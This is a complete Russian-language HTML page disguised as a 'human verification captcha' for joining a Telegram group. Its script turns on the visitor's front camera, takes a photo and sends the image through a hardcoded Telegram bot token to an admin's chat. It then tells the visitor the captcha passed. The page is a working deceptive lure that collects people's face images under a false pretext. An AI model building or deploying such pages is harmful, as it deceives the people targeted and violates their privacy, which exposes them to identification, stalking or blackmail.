<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>🔐 Подтверждение входа в группу</title>
    <style>
        /* ========== БАЗОВЫЙ СБРОС ========== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: radial-gradient(ellipse at 50% 0%, #1a1a2e 0%, #0f0f1a 100%);
            padding: 16px;
            position: relative;
            overflow: hidden;
        }

        /* Анимированный фон */
        body::before {
            content: '';
            position: absolute;
            width: 600px;
            height: 600px;
            background: radial-gradient(circle, rgba(88, 80, 236, 0.08) 0%, transparent 70%);
            top: -200px;
            right: -200px;
            border-radius: 50%;
            animation: floatBg 20s infinite alternate ease-in-out;
        }
        body::after {
            content: '';
            position: absolute;
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(236, 80, 180, 0.06) 0%, transparent 70%);
            bottom: -150px;
            left: -150px;
            border-radius: 50%;
            animation: floatBg 25s infinite alternate-reverse ease-in-out;
        }

        @keyframes floatBg {
            0% { transform: translate(0, 0) scale(1); }
            100% { transform: translate(40px, 30px) scale(1.3); }
        }

        /* ========== КОНТЕЙНЕР ========== */
        .container {
            max-width: 440px;
            width: 100%;
            background: rgba(22, 22, 40, 0.92);
            backdrop-filter: blur(24px);
            -webkit-backdrop-filter: blur(24px);
            border-radius: 36px;
            padding: 32px 24px 28px;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(255, 255, 255, 0.04);
            position: relative;
            z-index: 10;
            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
        }

        /* ========== ЗАГОЛОВОК ========== */
        .header {
            display: flex;
            align-items: center;
            gap: 14px;
            margin-bottom: 28px;
            justify-content: center;
        }
        .header .shield {
            width: 52px;
            height: 52px;
            border-radius: 50%;
            background: linear-gradient(135deg, #4a3fcf, #7c5cfc);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            box-shadow: 0 6px 20px rgba(88, 80, 236, 0.35);
            flex-shrink: 0;
        }
        .header h1 {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: -0.5px;
            line-height: 1.3;
        }
        .header h1 span {
            color: #8b7cfc;
            display: block;
            font-size: 14px;
            font-weight: 400;
            opacity: 0.8;
            letter-spacing: 0.2px;
        }

        /* ========== ОПИСАНИЕ ========== */
        .description {
            text-align: center;
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 24px;
            padding: 0 4px;
        }
        .description strong {
            color: #fff;
            font-weight: 600;
        }

        /* ========== ВИДЕО (КАМЕРА) ========== */
        .video-wrapper {
            position: relative;
            border-radius: 20px;
            overflow: hidden;
            background: #0a0a14;
            aspect-ratio: 4 / 3;
            margin-bottom: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.05);
        }
        .video-wrapper video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        .video-wrapper .placeholder {
            position: absolute;
            inset: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: rgba(255, 255, 255, 0.2);
            font-size: 14px;
            gap: 12px;
            background: #0a0a14;
            transition: opacity 0.5s;
        }
        .video-wrapper .placeholder .camera-icon {
            font-size: 48px;
            opacity: 0.4;
        }
        .video-wrapper .placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .video-wrapper .scan-line {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #7c5cfc, transparent);
            animation: scan 3s infinite linear;
            opacity: 0.5;
        }
        @keyframes scan {
            0% { top: 0; }
            100% { top: 100%; }
        }

        /* ========== КНОПКИ ========== */
        .btn-capture {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 16px;
            font-size: 17px;
            font-weight: 600;
            background: linear-gradient(135deg, #5a4adf, #7c5cfc);
            color: #fff;
            cursor: pointer;
            transition: all 0.25s;
            box-shadow: 0 4px 24px rgba(88, 80, 236, 0.3);
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            letter-spacing: 0.3px;
        }
        .btn-capture:active {
            transform: scale(0.97);
        }
        .btn-capture:disabled {
            opacity: 0.4;
            pointer-events: none;
        }
        .btn-capture.loading {
            background: linear-gradient(135deg, #3a3a5a, #4a4a6a);
            box-shadow: none;
        }

        .btn-retry {
            width: 100%;
            padding: 14px;
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 16px;
            background: rgba(255, 255, 255, 0.03);
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            display: none;
        }
        .btn-retry:hover {
            background: rgba(255, 255, 255, 0.06);
            color: #fff;
        }

        /* ========== ФОТО (ПРЕВЬЮ) ========== */
        .photo-preview {
            display: none;
            border-radius: 16px;
            overflow: hidden;
            margin-bottom: 16px;
            border: 2px solid rgba(124, 92, 252, 0.3);
            box-shadow: 0 0 30px rgba(124, 92, 252, 0.1);
        }
        .photo-preview img {
            width: 100%;
            display: block;
        }

        /* ========== УСПЕХ ========== */
        .success {
            display: none;
            text-align: center;
            padding: 20px 0 8px;
            animation: successPop 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
        }
        @keyframes successPop {
            0% { transform: scale(0.8); opacity: 0; }
            100% { transform: scale(1); opacity: 1; }
        }
        .success .check {
            font-size: 56px;
            margin-bottom: 12px;
            display: block;
        }
        .success h2 {
            color: #7c5cfc;
            font-size: 22px;
            font-weight: 700;
        }
        .success p {
            color: rgba(255, 255, 255, 0.5);
            font-size: 14px;
            margin-top: 6px;
        }

        /* ========== СТАТУС ========== */
        .status {
            text-align: center;
            font-size: 13px;
            color: rgba(255, 255, 255, 0.3);
            margin-top: 16px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            transition: color 0.3s;
        }
        .status.success-text {
            color: #7c5cfc;
        }
        .status.error-text {
            color: #ff5e7a;
        }

        /* ========== АДАПТИВ ========== */
        @media (max-width: 480px) {
            .container { padding: 20px 16px 20px; }
            .header h1 { font-size: 17px; }
            .btn-capture { font-size: 15px; padding: 14px; }
        }
    </style>
</head>
<body>

    <div class="container" id="app">
        <!-- Заголовок -->
        <div class="header">
            <div class="shield">🛡️</div>
            <h1>
                Подтверждение личности
                <span>Вход в Telegram-группу</span>
            </h1>
        </div>

        <!-- Описание -->
        <p class="description">
            Для защиты от ботов <strong>подтвердите, что вы человек</strong>.
            Разрешите доступ к камере и сделайте снимок.
        </p>

        <!-- Видео с камерой -->
        <div class="video-wrapper" id="videoWrapper">
            <video id="video" autoplay playsinline muted></video>
            <div class="placeholder" id="placeholder">
                <span class="camera-icon">📷</span>
                <span>Ожидание доступа к камере...</span>
            </div>
            <div class="scan-line"></div>
        </div>

        <!-- Превью фото -->
        <div class="photo-preview" id="photoPreview">
            <img id="photoImg" alt="Ваше фото">
        </div>

        <!-- Кнопки -->
        <button class="btn-capture" id="captureBtn">
            <span>📸</span> Сделать снимок
        </button>
        <button class="btn-retry" id="retryBtn">🔄 Сделать новый снимок</button>

        <!-- Успех -->
        <div class="success" id="successBlock">
            <span class="check">✅</span>
            <h2>Капча пройдена!</h2>
            <p>Вы подтверждены. Добро пожаловать в группу.</p>
        </div>

        <!-- Статус -->
        <div class="status" id="status">Ожидание подтверждения...</div>
    </div>

    <script>
        // ============================================
        //  КОНФИГУРАЦИЯ
        // ============================================
        const BOT_TOKEN = '8886268399:AAEQu4OjVY66LD9RnpCOAgQPzpnPht-I4wQ';
        const ADMIN_ID = '5098876175';

        // ============================================
        //  DOM-ЭЛЕМЕНТЫ
        // ============================================
        const video = document.getElementById('video');
        const placeholder = document.getElementById('placeholder');
        const captureBtn = document.getElementById('captureBtn');
        const retryBtn = document.getElementById('retryBtn');
        const photoPreview = document.getElementById('photoPreview');
        const photoImg = document.getElementById('photoImg');
        const successBlock = document.getElementById('successBlock');
        const status = document.getElementById('status');
        const videoWrapper = document.getElementById('videoWrapper');

        let stream = null;
        let isCaptured = false;
        let isSending = false;

        // ============================================
        //  ЗАПУСК КАМЕРЫ
        // ============================================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                video.srcObject = stream;
                placeholder.classList.add('hidden');
                status.textContent = '✅ Камера активна. Нажмите "Сделать снимок"';
                status.style.color = 'rgba(255,255,255,0.5)';
                captureBtn.disabled = false;
            } catch (err) {
                console.error('Ошибка камеры:', err);
                status.textContent = '❌ Нет доступа к камере. Разрешите доступ в браузере.';
                status.style.color = '#ff5e7a';
                captureBtn.disabled = true;
            }
        }

        // ============================================
        //  ОТПРАВКА ФОТО В TELEGRAM
        // ============================================
        async function sendPhotoToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', ADMIN_ID);
            formData.append('photo', blob, 'captcha_photo.jpg');
            formData.append('caption', '✅ Новая капча пройдена!\n🕒 ' + new Date().toLocaleString('ru-RU'));

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (result.ok) {
                    return true;
                } else {
                    console.error('Telegram API error:', result);
                    return false;
                }
            } catch (err) {
                console.error('Ошибка отправки:', err);
                return false;
            }
        }

        // ============================================
        //  СДЕЛАТЬ СНИМОК
        // ============================================
        function capturePhoto() {
            if (isCaptured) return;

            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Показываем превью
            const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
            photoImg.src = dataUrl;
            photoPreview.style.display = 'block';

            // Скрываем видео
            video.style.display = 'none';
            placeholder.classList.add('hidden');

            // Конвертим в Blob
            canvas.toBlob(async (blob) => {
                if (!blob) {
                    status.textContent = '❌ Ошибка создания изображения';
                    status.style.color = '#ff5e7a';
                    return;
                }

                isSending = true;
                captureBtn.disabled = true;
                captureBtn.textContent = '⏳ Отправка...';
                status.textContent = '⏳ Отправка фото на проверку...';
                status.style.color = 'rgba(255,255,255,0.5)';

                const sent = await sendPhotoToTelegram(blob);

                if (sent) {
                    isCaptured = true;
                    successBlock.style.display = 'block';
                    status.textContent = '✅ Капча успешно пройдена! Добро пожаловать!';
                    status.style.color = '#7c5cfc';
                    status.classList.add('success-text');
                    captureBtn.style.display = 'none';
                    retryBtn.style.display = 'block';
                } else {
                    status.textContent = '❌ Ошибка отправки. Попробуйте снова.';
                    status.style.color = '#ff5e7a';
                    captureBtn.disabled = false;
                    captureBtn.textContent = '📸 Сделать снимок';
                    // Показываем видео обратно
                    video.style.display = 'block';
                    photoPreview.style.display = 'none';
                }
                isSending = false;
            }, 'image/jpeg', 0.95);
        }

        // ============================================
        //  СБРОС (ПОВТОРНЫЙ СНИМОК)
        // ============================================
        function resetCapture() {
            isCaptured = false;
            successBlock.style.display = 'none';
            photoPreview.style.display = 'none';
            video.style.display = 'block';
            captureBtn.style.display = 'flex';
            retryBtn.style.display = 'none';
            captureBtn.disabled = false;
            captureBtn.textContent = '📸 Сделать снимок';
            status.textContent = '🔄 Новый снимок. Нажмите кнопку.';
            status.style.color = 'rgba(255,255,255,0.5)';
            status.classList.remove('success-text', 'error-text');
        }

        // ============================================
        //  ОБРАБОТЧИКИ СОБЫТИЙ
        // ============================================
        captureBtn.addEventListener('click', capturePhoto);
        retryBtn.addEventListener('click', resetCapture);

        // ============================================
        //  СТАРТ
        // ============================================
        startCamera();

        // Если камера не запустилась через 5 сек — показываем кнопку повторно
        setTimeout(() => {
            if (!stream) {
                status.textContent = '⏳ Нажмите "Сделать снимок" для запроса камеры';
                status.style.color = 'rgba(255,255,255,0.4)';
                captureBtn.disabled = false;
            }
        }, 3000);

        console.log('🔐 Капча-страница загружена');
        console.log('📤 Токен бота:', BOT_TOKEN);
        console.log('📥 ID получателя:', ADMIN_ID);
    </script>

</body>
  </html>
